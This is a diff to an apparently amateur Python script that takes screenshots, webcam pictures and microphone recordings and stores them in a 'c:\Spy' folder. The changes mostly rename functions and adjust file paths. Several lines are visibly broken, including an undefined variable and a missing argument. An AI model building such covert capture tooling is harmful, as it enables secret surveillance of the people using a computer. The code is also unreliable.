@@ -56,7 +56,7 @@ class WebcamDemon():
         WCC = self.cam_.get_image()
         return WCC
     def saveWCC(self, location):
-        pygame.image.save(image, r"" + str(location) + str(BKD.GetWCC()) + ".jpg")
+        pygame.image.save(image, r"" + str(location) + "\Webcamshot" + str(BKD.GetWCC()) + ".jpg")
 
 
 class ScreenshotDemon():
@@ -68,7 +68,7 @@ class ScreenshotDemon():
         return ss
 
     def saveSSC(self, ss, location):
-        ss.save(r"" + str(location) + str(BKD.GetSSC()) + ".jpg")
+        ss.save(r"" + str(location) + "\Screenshot"+ str(BKD.GetSSC()) + ".jpg")
 
 class MicrophoneDemon():
     def __init__(self):
@@ -82,12 +82,12 @@ class MicrophoneDemon():
         write('audiorecording.wav', samplerate, recording)
 
 
-def TakeScreenshot(SSC, BKD):
+def takeScreenshot(SSC, BKD):
     # Take a screenshot
     SSC.takeSSC()
 
     # Save to the spy folder
-    location = "c:\Spy\Screenshot"
+    location = 'c:\Spy'
     SSC.saveSSC(location)
 
     # Update records
@@ -95,12 +95,12 @@ def TakeScreenshot(SSC, BKD):
     BKD.IncrementSSC()
     print("Updated the BookKeeperDemon records")
 
-def TakeWebcamshot(WCD, BKD):
+def takeWebcamshot(WCD, BKD):
     # Take a picture with the webcam
     image = WCD.TakeWCC()
 
     # Save to the spy folder
-    location = "c:\Spy\Screenshot"
+    location = 'c:\Spy'
     WCD.saveWCC(location)
 
     # Update records
@@ -114,8 +114,8 @@ def Main():
     SSD = ScreenshotDemon()
     MPD = MicrophoneDemon()
     # WCD = WebcamDemon()
-    TakeScreenshot(SSD, BKD)
-    # TakeWebcamshot(WCD,BKD)
+    takeScreenshot(SSD, BKD)
+    # takeWebcamshot(WCD,BKD)
     MPD.takeAudioRecording(44100, 10)
     
 
